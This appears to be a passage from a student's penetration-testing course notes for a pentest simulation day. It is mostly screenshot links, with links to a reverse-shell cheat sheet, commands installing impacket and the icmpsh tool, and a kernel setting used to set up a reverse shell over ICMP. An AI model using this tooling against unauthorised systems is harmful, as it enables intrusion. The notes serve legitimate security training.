https://pentestmonkey.net/tools/audit/unix-privesc-check
```

```
https://www.cyberciti.biz/open-source/command-line-hacks/linux-run-command-as-different-user/
```

![](assets/2022-09-02-20-48-00-image.png)

![](assets/2022-09-02-20-50-58-image.png)

```
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
```

![](assets/2022-09-02-20-57-19-image.png)

![](assets/2022-09-02-20-59-05-image.png)

---

## Day 12 - Pentest simulation and report creation



```
sudo apt install python3-pip
sudo git clone https://github.com/SecureAuthCorp/impacket.git
sudo pip3 install -r /opt/impacket/requirements.txt
sudo python3 /opt/impacket/setup.py install
sudo git clone https://github.com/bdamele/icmpsh.git
cd icmpsh
```





![](assets/2022-09-03-19-07-33-image.png)

![](assets/2022-09-03-19-07-59-image.png)

```
sudo git clone https://github.com/SecureAuthCorp/impacket.git
```

![](assets/2022-09-03-19-09-12-image.png)

![](assets/2022-09-03-19-09-42-image.png)

```
sudo git clone https://github.com/bdamele/icmpsh.git
```

![](assets/2022-09-03-19-12-12-image.png)

![](assets/2022-09-03-19-14-34-image.png)

```
net.ipv4.icmp_echo_ignore_all=1
```

![](assets/2022-09-03-19-17-33-image.png)

![](assets/2022-09-03-19-19-03-image.png)

![](assets/2022-09-03-19-21-27-image.png)

![](assets/2022-09-03-19-21-44-image.png)

![](assets/2022-09-03-19-22-16-image.png)

![](assets/2022-09-03-19-22-58-image.png)

**Reverse shell via ICMP**

![](assets/2022-09-03-19-33-38-image.png)

![](assets/2022-09-03-19-34-03-image.png)

![](assets/2022-09-03-19-35-18-image.png)

![](assets/2022-09-03-19-39-22-image.png)

```
https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/attack-simulation-training-get-started?view=o365-worldwide
```



![](assets/2022-09-03-20-01-46-image.png)



> You would've been the guy they would've pointed the finger at if shit hit the fan.
> 
> In the CSS class, the term "CYA" was used. CYA standing for "Cover your ass", which means, in situations like this, when management is making questionable decisions against your advice, make sure to get it in writing, so that you're safe when shit does hit the fan :)



![](assets/2022-09-03-20-20-56-image.png)

![](assets/2022-09-03-20-21-59-image.png)

![](assets/2022-09-03-20-22-16-image.png)

![](assets/2022-09-03-20-23-12-image.png)

![](assets/2022-09-03-20-23-19-image.png)

![](assets/2022-09-03-20-23-30-image.png)

![](assets/2022-09-03-20-26-35-image.png)

![](assets/2022-09-03-20-26-46-image.png)

![](assets/2022-09-03-20-27-11-image.png)

![](assets/2022-09-03-20-34-02-image.png)

![](assets/2022-09-03-20-35-08-image.png)

![](assets/2022-09-03-20-40-08-image.png)

![](assets/2022-09-03-20-41-10-image.png)

![](assets/2022-09-03-20-42-26-image.png)

![](assets/2022-09-03-20-44-26-image.png)

![](assets/2022-09-03-20-44-37-image.png)

![](assets/2022-09-03-20-52-04-image.png)







![](assets/2022-09-03-21-00-13-image.png)

---

> [All Scripts](assets/Scripts.zip)



> [Pentest Report Template](assets/satiexs-penetration-test-report-template.docx)
